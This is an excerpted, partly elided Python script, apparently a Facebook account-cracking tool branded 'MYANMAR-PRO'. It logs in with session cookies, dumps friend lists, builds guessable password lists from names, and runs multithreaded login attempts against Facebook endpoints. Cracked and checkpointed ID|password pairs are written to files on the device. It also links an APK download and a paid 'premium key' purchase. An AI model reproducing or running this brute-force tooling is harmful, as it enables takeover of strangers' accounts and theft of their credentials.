...
os.system('xdg-open https://www.facebook.com/koshar09451227686/')
...
logo=("""\033[1;36m
 ...
 db   dD  .d88b.       .d8888. db   db  .d8b.  d8888b. 
 88 ,8P' .8P  Y8.      88'  YP 88   88 d8' `8b 88  `8D 
 88,8P   88    88      `8bo.   88ooo88 88ooo88 88oobY' 
 88`8b   88    88        `Y8b. 88~~~88 88~~~88 88`8b   
 88 `88. `8b  d8'      db   8D 88   88 88   88 88 `88. 
 YP   YD  `Y88P'       `8888Y' YP   YP YP   YP 88   YD \033[1;31mK\033[1;37m \033[1;31mS \033[1;37m
\033[1;34m-----------------------------------------------------------
 Author    ⚙ ACDC-KO SHAR
 Github    ⚙ ACDC-404
 Facebook  ⚙ MR.KOSHAR.ACDC
 Tool Name ⚙ MYANMAR-PRO
 Type type ⚙ FREE
 Version   ⚙ 0.0.1
\033[1;30m-----------------------------------------------------------
 MYANMAR-PRO version 0.0.1
 👉👉👉: mingalarpar taw thar tway
\033[1;32m-----------------------------------------------------------""")
def linex():
        print('\033[1;35m-----------------------------------------------------------')
def clear():
...
def login():
        ...
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
...
def public():
        ...
        if cx in ['y','Y','yes','Yes','1']:
                ...
                pcp.append('n')
        linex()
        print('\031[1;32m Dumping friend list...\031[1;37m')
        linex()
        for userr in usrr:
                try:
        ...
        try:
                ...
                try:
                        ...
                        ps_limit =1
                linex()
                print('\031[1;32m exp: first last,firtslast,first123')
                linex()
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/koshar09451227686/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/KS_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi KS Sir, I Need To Buy Your Paid KS PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python KS.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as KS:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [KS-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        KS=session.cookies.get_dict().keys()
                        if "c_user" in KS:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [KS-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in KS:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [KS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [KS-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/KS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [KS-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/KS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [KS-OK] '+uid+' | '+pas+'\033[1;97m')
